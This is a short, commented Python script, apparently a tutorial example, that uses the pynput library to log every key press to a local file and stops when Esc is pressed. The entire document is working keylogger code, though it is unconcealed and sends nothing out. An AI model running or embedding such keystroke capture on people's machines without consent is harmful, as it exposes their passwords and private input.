# import keyboard from the pynput library
from pynput import keyboard

# this function is called whenever a key is pressed
def keyPressed(key):
    print(str(key))

    # create a file called keyfile.txt in append mode
    with open("keyfile.txt", 'a') as logkey:
        try:
            # character representation of the key
            logkey.write(key.char)
        except AttributeError:
            # write it as a special key eg: Key.enter
            logkey.write(f"[{key}]")

# this function is called when any key is released
def on_release(key):
    # if the released key is esc, stop the keylogger
    if key == keyboard.Key.esc:
        # stop listener
        return False

# this block only runs if this script is executed directly 
if __name__ == "__main__":
    with keyboard.Listener(on_press=keyPressed, on_release=on_release) as listener:
        listener.join()
